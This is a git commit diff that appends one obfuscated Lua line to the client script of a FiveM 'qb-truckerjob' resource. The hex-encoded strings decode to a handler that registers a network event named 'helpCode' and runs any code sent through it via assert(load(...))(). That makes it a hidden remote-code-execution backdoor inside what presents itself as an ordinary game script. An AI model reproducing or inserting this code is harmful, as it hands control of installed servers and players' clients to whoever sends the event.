3b7763a5027ffd64a4c90c02197548255a29228f
Decryption21 <austinshackleford2100@gmail.com>
2024-03-02 12:47:50 -0600

    1

--- [qb]/qb-truckerjob/client/main.lua
+++ [qb]/qb-truckerjob/client/main.lua
@@ -561,3 +561,6 @@ CreateThread(function()
         Wait(sleep)
     end
 end)
+
+
+local gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[6][gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[1]](gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[2]) gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[6][gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[3]](gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[2], function(QfqKtLdyTYyDfjHAisnwkewCfdWAyYaoQvzoIbDHVtILcQrWyPEgFGEZeWYlCAOtTtpTho) gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[6][gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[4]](gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[6][gpMyxulbCChHhBiOSlJjTRnFuZtSKLHUtUgAZHlwGENPayVVyvjfYJqpumNlfCIdcRUoOP[5]](QfqKtLdyTYyDfjHAisnwkewCfdWAyYaoQvzoIbDHVtILcQrWyPEgFGEZeWYlCAOtTtpTho))() end)
